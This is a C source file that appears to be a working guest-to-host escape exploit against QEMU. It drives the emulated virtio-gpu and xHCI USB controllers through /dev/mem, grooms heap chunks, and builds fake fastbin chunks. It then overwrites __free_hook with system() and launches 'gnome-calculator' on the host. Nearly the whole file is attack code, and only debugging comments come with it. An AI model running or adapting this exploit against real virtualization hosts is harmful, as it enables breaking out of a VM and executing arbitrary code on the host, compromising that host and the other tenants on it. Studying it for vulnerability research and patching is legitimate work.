/*
    Boot command : 
            -drive file=./nvme.img,if=none,id=D22 -device nvme,drive=D22,serial=1234,cmb_size_mb=64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <errno.h>
#include "common.h"

#define VIRTIO_PCI_COMMON_STATUS	20
#define VIRTIO_PCI_COMMON_Q_SELECT  22
#define VIRTIO_PCI_COMMON_Q_SIZE	24
#define VIRTIO_PCI_COMMON_Q_ENABLE	28
#define VIRTIO_PCI_COMMON_Q_DESCLO	32
#define VIRTIO_PCI_COMMON_Q_DESCHI	36
#define VIRTIO_PCI_COMMON_Q_AVAILLO	40
#define VIRTIO_PCI_COMMON_Q_AVAILHI	44

#define VRING_DESC_F_NEXT           1

#define VIRTIO_GPU_CMD_RESOURCE_CREATE_2D       0x101
#define VIRTIO_GPU_CMD_RESOURCE_UNREF           0x102
#define VIRTIO_GPU_CMD_TRANSFER_TO_HOST_2D      0x105
#define VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING  0x106
#define VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING  0x107

#define VIRTIO_CONFIG_S_DRIVER_OK   4
#define VRING_DESC_F_WRITE          2


#define OFF_OPER        0x40
#define OFF_DOORBELL    0x2000

#define USBCMD_RS       (1<<0)
#define USBCMD_HCRST    (1<<1)
#define CRCR_RCS        (1<<0)
#define CRCR_CS         (1<<1)
#define CRCR_CA         (1<<2)
#define CRCR_CRR        (1<<3)

#define TR_DATA         3
#define TRB_TR_CH       (1<<4)
#define TRB_TR_DIR      (1<<16)

#define CR_ENABLE_SLOT          9
#define CR_ADDRESS_DEVICE       11
#define CR_CONFIGURE_ENDPOINT   12
#define CR_RESET_ENDPOINT       14
#define CR_STOP_ENDPOINT        15
#define CR_NOOP                 23

#define ET_BULK_OUT             2
#define ET_BULK_IN              6

uint32_t xhci_mmio_addr  = 0xfebf0000;
uint32_t xhci_mmio_size  = 0x4000;
uint32_t gpu_mmio_addr  = 0xfe000000;
uint32_t gpu_mmio_size  = 0x4000;

char *xhci_mmio_base;
char *gpu_mmio_base;

typedef struct VRingDesc
{
    uint64_t addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next;
} VRingDesc, *VRingDesc_t;

typedef struct VRingAvail
{
    uint16_t flags;
    uint16_t idx;
    uint16_t ring[];
} VRingAvail, *VRingAvail_t;

typedef struct XHCITRB {
    uint64_t parameter;
    uint32_t status;
    uint32_t control;
} XHCITRB, *XHCITRB_t;


struct virtio_gpu_ctrl_hdr 
{
	uint32_t type;
	uint32_t flags;
	uint64_t fence_id;
	uint32_t ctx_id;
	uint32_t padding;
};

typedef struct virtio_gpu_resource_attach_backing 
{
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t nr_entries;
} virtio_gpu_resource_attach_backing, *virtio_gpu_resource_attach_backing_t;

typedef struct virtio_gpu_resource_detach_backing {
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t padding;
}virtio_gpu_resource_detach_backing, *virtio_gpu_resource_detach_backing_t;

typedef struct virtio_gpu_mem_entry 
{   
	uint64_t addr;
	uint32_t length;
	uint32_t padding;
} virtio_gpu_mem_entry, *virtio_gpu_mem_entry_t;

typedef struct virtio_gpu_resource_create_2d 
{
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t format;
	uint32_t width;
	uint32_t height;
} virtio_gpu_resource_create_2d, *virtio_gpu_resource_create_2d_t;

typedef struct virtio_gpu_resource_unref {
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t padding;
} virtio_gpu_resource_unref, *virtio_gpu_resource_unref_t;

struct virtio_gpu_rect {
	uint32_t x;
	uint32_t y;
	uint32_t width;
	uint32_t height;
};

typedef struct virtio_gpu_transfer_to_host_2d {
	struct virtio_gpu_ctrl_hdr hdr;
	struct virtio_gpu_rect r;
	uint64_t offset;
	uint32_t resource_id;
	uint32_t padding;
} virtio_gpu_transfer_to_host_2d, *virtio_gpu_transfer_to_host_2d_t;

void err(char *msg)
{
    printf("[!] %s\n", msg);
    exit(1);
}

uint32_t xhci_oper_rd32(uint32_t addr)
{
    return *((uint32_t*)(xhci_mmio_base + OFF_OPER + addr));
}

void xhci_oper_wr32(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(xhci_mmio_base + OFF_OPER + addr)) = value;
}

uint32_t xhci_doorbell_rd32(uint32_t addr)
{
    return *((uint32_t*)(xhci_mmio_base + OFF_DOORBELL + addr));
}

void xhci_doorbell_wr32(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(xhci_mmio_base + OFF_DOORBELL + addr)) = value;
}

void gpu_wr32(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(gpu_mmio_base + addr)) = value;
}

VRingDesc_t desc;
VRingAvail_t avail;

void init_gpu() 
{
    desc = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
    if(desc == MAP_FAILED)
        err("[!] mmap desc failed");

    avail = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
    if(avail == MAP_FAILED)
        err("[!] mmap avail failed");

    mlock(desc, 0x1000);   // map memory
    mlock(avail, 0x1000);

    gpu_wr32(VIRTIO_PCI_COMMON_STATUS, 0);     // reset 
    gpu_wr32(VIRTIO_PCI_COMMON_Q_SELECT, 0);   // queue_sel = 0
    gpu_wr32(VIRTIO_PCI_COMMON_Q_SIZE, 640);   // vqs[0].num = 640, vq[0].vring.num = 640
    gpu_wr32(VIRTIO_PCI_COMMON_Q_DESCLO, (uint32_t)gva_to_gpa(desc));   // vqs[0].desc[0] = desc & 0xffffffff
    gpu_wr32(VIRTIO_PCI_COMMON_Q_DESCHI, (uint32_t)(gva_to_gpa(desc) >> 32));   // vqs[0].desc[1] = desc >> 32
    gpu_wr32(VIRTIO_PCI_COMMON_Q_AVAILLO, (uint32_t)gva_to_gpa(avail));  // vqs[0].avail[0] = avail & 0xffffffff
    gpu_wr32(VIRTIO_PCI_COMMON_Q_AVAILHI, (uint32_t)(gva_to_gpa(avail) >> 32));  // vqs[0].avail[1] = avail >> 32
    gpu_wr32(VIRTIO_PCI_COMMON_Q_ENABLE, 1);   // vq[0].desc = desc \
                                                  vq[0].avail = avail \
                                                  map desc and avail \
                                                  vqs[0].enabled = 1
    printf("[+] Init gpu done!\n");
}

uint32_t ring_idx = 0;

void init_gpu_resources(uint32_t resource_id_cnt)
{
    uint32_t resource_id;

    virtio_gpu_resource_create_2d_t gpu_cmd = (virtio_gpu_resource_create_2d_t)malloc(sizeof(virtio_gpu_resource_create_2d) * resource_id_cnt);
    for(resource_id = 1; resource_id <= resource_id_cnt; resource_id++)
    {
        gpu_cmd[resource_id - 1].hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
        gpu_cmd[resource_id - 1].resource_id = resource_id;
        gpu_cmd[resource_id - 1].format = 1;
        gpu_cmd[resource_id - 1].width = 1;
        gpu_cmd[resource_id - 1].height = 1;

        desc[resource_id - 1].addr = gva_to_gpa(&gpu_cmd[resource_id - 1]);
        desc[resource_id - 1].len = sizeof(virtio_gpu_resource_create_2d);
        desc[resource_id - 1].flags = 0;
        desc[resource_id - 1].next = 0;

        avail->idx = ring_idx + 1;
        avail->ring[ring_idx++] = resource_id - 1;
    }

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(1);

    printf("[+] Init gpu resource done.\n");
}

virtio_gpu_mem_entry_t ent;

void allocate_extra_chunk(uint32_t resource_id, int demand_size)
{
    virtio_gpu_resource_attach_backing_t gpu_cmd = (virtio_gpu_resource_attach_backing_t)malloc(sizeof(virtio_gpu_resource_attach_backing));
    gpu_cmd->hdr.type = VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING;
    gpu_cmd->resource_id = resource_id;
    gpu_cmd->nr_entries = (demand_size - 0x8) / 0x8;

    desc[0].addr = gva_to_gpa(gpu_cmd);
    desc[0].len = sizeof(virtio_gpu_resource_attach_backing);
    desc[0].flags = VRING_DESC_F_NEXT;
    desc[0].next = 1;

    ent = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry));
    ent->addr = gva_to_gpa(ent);
    ent->length = sizeof(virtio_gpu_mem_entry);

    int i;
    for(i = 1; i <= gpu_cmd->nr_entries; i++)
    {
        if(i != gpu_cmd->nr_entries)
        {
            desc[i].addr = gva_to_gpa(ent);
            desc[i].len = sizeof(virtio_gpu_mem_entry);
            desc[i].flags = VRING_DESC_F_NEXT;
            desc[i].next = i + 1;
        }
        else
        {
            desc[i].addr = gva_to_gpa(ent);
            desc[i].len = sizeof(virtio_gpu_mem_entry);
            desc[i].flags = 0;
            desc[i].next = 0;
        }
    }

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 0;

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(1);
}

uint64_t *fake_fastbin;
uint64_t fake_fastbin_addr;

void prepare_fake_fastbin()
{
    char *tmp_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
    if(desc == MAP_FAILED)
        err("[!] mmap tmp_buf failed");

    mlock(tmp_buf, 0x1000);

    fake_fastbin = (uint64_t *)(tmp_buf + 0xE00);

    fake_fastbin[0x0] = 0;
    fake_fastbin[0x1] = 0x31;
    fake_fastbin[0x6] = 0;
    fake_fastbin[0x7] = 0x31;
    fake_fastbin[0xC] = 0;
    fake_fastbin[0xD] = 0x31;
}

void prepare_iov_chunk(uint32_t resource_id, int demand_size, int control_size)
{
    virtio_gpu_resource_attach_backing_t gpu_cmd = (virtio_gpu_resource_attach_backing_t)malloc(sizeof(virtio_gpu_resource_attach_backing));
    gpu_cmd->hdr.type = VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING;
    gpu_cmd->resource_id = resource_id;
    gpu_cmd->nr_entries = (demand_size - 0x10) / 0x10;

    desc[0].addr = gva_to_gpa(gpu_cmd);
    desc[0].len = sizeof(virtio_gpu_resource_attach_backing);
    desc[0].flags = VRING_DESC_F_NEXT;
    desc[0].next = 1;

    ent = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry));
    ent->addr = gva_to_gpa(ent);
    ent->length = control_size;

    int i;
    for(i = 1; i <= gpu_cmd->nr_entries; i++)
    {
        if(i != gpu_cmd->nr_entries)
        {
            desc[i].addr = gva_to_gpa(ent);
            desc[i].len = sizeof(virtio_gpu_mem_entry);
            desc[i].flags = VRING_DESC_F_NEXT;
            desc[i].next = i + 1;
        }
        else
        {
            desc[i].addr = gva_to_gpa(ent);
            desc[i].len = sizeof(virtio_gpu_mem_entry);
            desc[i].flags = 0;
            desc[i].next = 0;
        }
    }

    virtio_gpu_mem_entry_t wrong_ent = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry));
    wrong_ent->addr = gva_to_gpa(ent);
    wrong_ent->length = 0;

    virtio_gpu_mem_entry_t target_ent = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry));
    target_ent->addr = gva_to_gpa(fake_fastbin);
    target_ent->length = 0x30;

    desc[gpu_cmd->nr_entries - 1].addr = gva_to_gpa(target_ent);
    desc[gpu_cmd->nr_entries].addr = gva_to_gpa(wrong_ent);

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 0;

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(1);
}

void spray_to_fake_fastbin()
{
    int resource_id;
    int i;
    virtio_gpu_resource_attach_backing_t gpu_cmd;
    virtio_gpu_mem_entry_t ents;

    printf("%p, %p\n", (void *)fake_fastbin[2], (void *)fake_fastbin[3]);
    fake_fastbin[2] = 0;
    printf("[+] Start to spray.\n");

    gpu_cmd = (virtio_gpu_resource_attach_backing_t)malloc(sizeof(virtio_gpu_resource_attach_backing) * 80);
    ents = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry) * 80);

    for(i = 0; i < 80; i++)
    {
        resource_id = 20 + i;

        ents[i].addr = gva_to_gpa(fake_fastbin);
        ents[i].length = 20 + i;

        gpu_cmd[i].hdr.type = VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING;
        gpu_cmd[i].resource_id = resource_id;
        gpu_cmd[i].nr_entries = 2;

        desc[i].addr = gva_to_gpa(&gpu_cmd[i]);
        desc[i].len = sizeof(virtio_gpu_resource_attach_backing);
        desc[i].flags = VRING_DESC_F_NEXT;
        desc[i].next = 80 + i;

        desc[80 + i].addr = gva_to_gpa(&ents[i]);
        desc[80 + i].len = sizeof(virtio_gpu_resource_attach_backing);
        desc[80 + i].flags = VRING_DESC_F_NEXT;
        desc[80 + i].next = 160;

        avail->idx = ring_idx + 1;
        avail->ring[ring_idx++] = i;
    }

    desc[160].addr = gva_to_gpa(&ents[0]);
    desc[160].len = sizeof(virtio_gpu_resource_attach_backing);
    desc[160].flags = 0;
    desc[160].next = 0;

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(3);

    fake_fastbin_addr = fake_fastbin[2];

    if(fake_fastbin[3] >= 20 && fake_fastbin[3] <= 100)
        printf("[+] fake_fastbin address: %p, resource_id: %ld\n", (void *)fake_fastbin[2], fake_fastbin[3]);
    else
    {
        printf("[+] fake_fastbin address: %p, resource_id: %ld\n", (void *)fake_fastbin[2], fake_fastbin[3]);
        printf("[!] Failed to fetch the target fake fastbin, try again!\n");
        exit(1);
    }

    // if(resource_id != 101)
    //     printf("[+] Successfully get the fastbin chunk, and the resource id is %d\n", resource_id);
    // else
    //     printf("[+] Failed to get the fastbin chunk.\n");
}

void hijack_image()
{
    int resource_id = 101;

    fake_fastbin[0] = 0;
    fake_fastbin[1] = 0x111;
    fake_fastbin[0x22] = 0;
    fake_fastbin[0x23] = 0x21;
    fake_fastbin[0x26] = 0;
    fake_fastbin[0x27] = 0x21;

    virtio_gpu_resource_detach_backing_t gpu_cmd_0 = (virtio_gpu_resource_detach_backing_t)malloc(sizeof(virtio_gpu_resource_detach_backing));
    gpu_cmd_0->hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;
    gpu_cmd_0->resource_id = fake_fastbin[3];
    virtio_gpu_resource_create_2d_t gpu_cmd_1 = (virtio_gpu_resource_create_2d_t)malloc(sizeof(virtio_gpu_resource_create_2d));
    gpu_cmd_1->hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
    gpu_cmd_1->resource_id = resource_id;
    gpu_cmd_1->format = 1;
    gpu_cmd_1->width = 1;
    gpu_cmd_1->height = 1;    
    virtio_gpu_resource_attach_backing_t gpu_cmd_2 = (virtio_gpu_resource_attach_backing_t)malloc(sizeof(virtio_gpu_resource_attach_backing));
    gpu_cmd_2->hdr.type = VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING;
    gpu_cmd_2->resource_id = resource_id;
    gpu_cmd_2->nr_entries = 1;
    uint64_t *control_buf = malloc(0x100);
    ent = (virtio_gpu_mem_entry_t)malloc(sizeof(virtio_gpu_mem_entry));
    ent->addr = gva_to_gpa(control_buf);
    ent->length = 0x100;

    desc[161].addr = gva_to_gpa(gpu_cmd_0);
    desc[161].len = sizeof(virtio_gpu_resource_detach_backing);
    desc[161].flags = 0;
    desc[161].next = 0;

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 161;

    desc[162].addr = gva_to_gpa(gpu_cmd_1);
    desc[162].len = sizeof(virtio_gpu_resource_create_2d);
    desc[162].flags = 0;
    desc[162].next = 0;

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 162;
    
    desc[163].addr = gva_to_gpa(gpu_cmd_2);
    desc[163].len = sizeof(virtio_gpu_resource_attach_backing);
    desc[163].flags = VRING_DESC_F_NEXT;
    desc[163].next = 164;
    desc[164].addr = gva_to_gpa(ent);
    desc[164].len = sizeof(virtio_gpu_mem_entry);
    desc[164].flags = 0;
    desc[164].next = 0;

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 163;
    
    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(2);

    printf("[+] Hijack image done.\n");
    printf("[+] Address of image->common.property_changed: %p\n", (void *)fake_fastbin[0x10]);
    printf("[+] Now hijack image->bits.bits to __free_hook.\n");

    getchar();

    control_buf[0] = (uint64_t)fake_fastbin[0x10] - 0x764b50; // system
    fake_fastbin[0x16] = 0x100000001; // height = 1, width = 1
    fake_fastbin[0x17] = (uint64_t)fake_fastbin[0x10] - 0x5c7f98; // bits = __free_hook
    *(uint32_t *)(&fake_fastbin[0x19]) = 2; // rowstride = 2

    memcpy((char *)&fake_fastbin[0x30], "gnome-calculator", 17);
    fake_fastbin[0x9] = fake_fastbin_addr + 0x30 * 8; // transform = &"gnome-calculator"

    virtio_gpu_transfer_to_host_2d_t gpu_cmd_3 = (virtio_gpu_transfer_to_host_2d_t)malloc(sizeof(virtio_gpu_transfer_to_host_2d));
    gpu_cmd_3->hdr.type = VIRTIO_GPU_CMD_TRANSFER_TO_HOST_2D;
    gpu_cmd_3->resource_id = resource_id;
    gpu_cmd_3->r.x = 0;
    gpu_cmd_3->r.y = 0;
    gpu_cmd_3->r.width = 1;
    gpu_cmd_3->r.height = 0;
    gpu_cmd_3->offset = 0;

    desc[165].addr = gva_to_gpa(gpu_cmd_3);
    desc[165].len = sizeof(virtio_gpu_transfer_to_host_2d);
    desc[165].flags = 0;
    desc[165].next = 0;

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 165;

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(1);

    printf("[+] Now trigger __free_hook.\n");
    
    virtio_gpu_resource_unref_t gpu_cmd_4 = (virtio_gpu_resource_unref_t)malloc(sizeof(virtio_gpu_resource_unref));
    gpu_cmd_4->hdr.type = VIRTIO_GPU_CMD_RESOURCE_UNREF;
    gpu_cmd_4->resource_id = resource_id;

    desc[166].addr = gva_to_gpa(gpu_cmd_4);
    desc[166].len = sizeof(virtio_gpu_resource_unref);
    desc[166].flags = 0;
    desc[166].next = 0;

    avail->idx = ring_idx + 1;
    avail->ring[ring_idx++] = 166;

    gpu_wr32(0x3000, 0); // trigger virtio_pci_notify_write
    sleep(1);
}

XHCITRB_t ring;
uint64_t *dcbaap;

void init_xhci() 
{
    ring = (XHCITRB_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(ring == MAP_FAILED)
        err("[!] mmap ring failed");

    dcbaap = (uint64_t *)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(dcbaap == MAP_FAILED)
        err("[!] mmap dcbaap failed");

    mlock(ring, 0x1000);
    mlock(dcbaap, 0x1000);

    int i;
    for(i = 0; i < 0x100; i++)
    {
        ring[i].control = (CR_NOOP << 10) | 1;
        ring[i].parameter = 0;
        ring[i].status = 0;
    }

    xhci_oper_wr32(0, USBCMD_HCRST); // reset
    xhci_oper_wr32(0, USBCMD_RS);    // run xhci
    xhci_oper_wr32(0x18, (uint32_t)gva_to_gpa(ring)); // set xhci->cmd_ring
    xhci_oper_wr32(0x1C, (uint32_t)(gva_to_gpa(ring) >> 32));
    xhci_oper_wr32(0x30, (uint32_t)gva_to_gpa(dcbaap)); // set dcbaap
    xhci_oper_wr32(0x34, (uint32_t)(gva_to_gpa(dcbaap) >> 32));

    printf("[+] Init xhci done!\n");
}

char *ictx_ring_0;
char *ictx_ring_1;
char *octx;
XHCITRB_t epctx_dequeue;

void do_init_slot_and_ep(int slotid, int epid)
{
    ictx_ring_0 = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(ictx_ring_0 == MAP_FAILED)
        err("[!] mmap ictx_ring_0 failed");
    ictx_ring_1 = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(ictx_ring_1 == MAP_FAILED)
        err("[!] mmap ictx_ring_1 failed");

    octx = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(octx == MAP_FAILED)
        err("[!] mmap octx failed");

    epctx_dequeue = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(epctx_dequeue == MAP_FAILED)
        err("[!] mmap epctx_dequeue failed");

    mlock(ictx_ring_0, 0x1000);
    mlock(ictx_ring_1, 0x1000);
    mlock(octx, 0x1000);
    mlock(epctx_dequeue, 0x1000);

    // enable slots[slotid]
    ring[0].control = (slotid << 24) | (CR_ENABLE_SLOT << 10) | 1; 

    // configure slots[slotid]
    uint32_t *ictl_ctx = (uint32_t *)ictx_ring_0;
    uint32_t *slot_ctx = (uint32_t *)(ictx_ring_0 + 32);
    uint32_t *ep0_ctx = (uint32_t *)(ictx_ring_0 + 64);
    dcbaap[slotid] = gva_to_gpa(octx);
    ictl_ctx[0] = 0;
    ictl_ctx[1] = 3;
    slot_ctx[0] = 0;
    slot_ctx[1] = 5 << 16;
    ring[1].control = (slotid << 24) | (CR_ADDRESS_DEVICE << 10) | 1;
    ring[1].parameter = gva_to_gpa(ictx_ring_0);

    // configure slots[0]->ep[0x10]
    uint32_t *ep_ctx = (uint32_t *)(ictx_ring_1 + 32 + 32 * epid);
    ictl_ctx = (uint32_t *)ictx_ring_1;
    ictl_ctx[0] = 0;
    ictl_ctx[1] = (1 << epid) | 1;
    ep_ctx[0] = 0;
    ep_ctx[1] = ET_BULK_IN << 3;
    ep_ctx[2] = (gva_to_gpa(epctx_dequeue) & 0xffffffff) | 1;
    ep_ctx[3] = gva_to_gpa(epctx_dequeue) >> 32;
    ep_ctx[4] = 0;
    ring[2].control = (slotid << 24) | (CR_CONFIGURE_ENDPOINT << 10) | 1;
    ring[2].parameter = gva_to_gpa(ictx_ring_1);

    xhci_doorbell_wr32(0, 0);
    sleep(1);

    printf("[+] Init slot and endpoint done.\n");
}

char *bulk_buffer;

void start_bulk_receiving()
{
    bulk_buffer = mmap(0, 0x20000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if(bulk_buffer == MAP_FAILED)
        err("[!] mmap bulk_buffer failed"); 

    mlock(bulk_buffer, 0x1000);

    do_init_slot_and_ep(1, 0x3);

    epctx_dequeue[0].control = TRB_TR_DIR | (TR_DATA << 10) | 1;
    epctx_dequeue[0].parameter = gva_to_gpa(bulk_buffer);
    epctx_dequeue[0].status = 0x1FFF0;

    xhci_doorbell_wr32(0x4, 0x3); // streamid = 0, slotid = 1, epid = 0x3
    sleep(1);

    printf("[+] Start bulk receiving.\n");
}

void stop_bulk_receiving()
{
    xhci_oper_wr32(0x18, (uint32_t)gva_to_gpa(ring)); // reset xhci->cmd_ring
    xhci_oper_wr32(0x1C, (uint32_t)(gva_to_gpa(ring) >> 32));
    xhci_oper_wr32(0, USBCMD_RS);    // run xhci

    int i;
    for(i = 0; i < 0x100; i++)
    {
        ring[i].control = (CR_NOOP << 10) | 1;
        ring[i].parameter = 0;
        ring[i].status = 0;
    }

    ring[0].control = (1 << 24) | (0x3 << 16) | (CR_STOP_ENDPOINT << 10) | 1;

    xhci_doorbell_wr32(0, 0);
    sleep(1);

    printf("[+] Stop bulk receiving.\n");
}

int main(int argc, char *argv[])
{
    int i;

    xhci_mmio_base = mem_map("/dev/mem", xhci_mmio_addr, xhci_mmio_size);
    if ( !xhci_mmio_base ) {
        return 0;
    }

    gpu_mmio_base = mem_map("/dev/mem", gpu_mmio_addr, gpu_mmio_size);
    if ( !gpu_mmio_base ) {
        return 0;
    }

    init_xhci();
    init_gpu();

    init_gpu_resources(100);

    prepare_fake_fastbin();
    for(i = 1; i <= 7; i++)
        prepare_iov_chunk(i, 0x190, 0x31);
    printf("[+] Prepare tcache bins done.\n");

    getchar();

    start_bulk_receiving();

    for(i = 9; i <= 15; i++)
        allocate_extra_chunk(i, 0x190);
    printf("[+] Allocate extra chunk done.\n");  // consume small bins

    getchar();

    stop_bulk_receiving();

    for(i = 1; i <= 2; i++)
        prepare_iov_chunk(i, 0x190, 0x31);
    printf("[+] Check now.\n");

    getchar();

    spray_to_fake_fastbin();

    getchar();

    hijack_image();

    // allocate_extra_chunk(0x400 - 0x10);
    // free_extra_chunk();

    // prepare_tx_buffer_again();
    // prepare_rx_buffer_again();

    return 0;
}

/*
xhci_doorbell_write
xhci_kick_ep
xhci_kick_epctx
xhci_fire_transfer
xhci_submit
usb_handle_packet
usb_process_one
usb_device_handle_data
klass->handle_data              (usbredir_handle_data)
usbredir_handle_bulk_data
*/

/*
define find_resource
set $idx = $arg0
set $head = g->reslist.tqh_first
while ($idx != 0)
set $head = $head.next.tqe_next
set $idx = $idx - 1
end
print *$head
end
*/
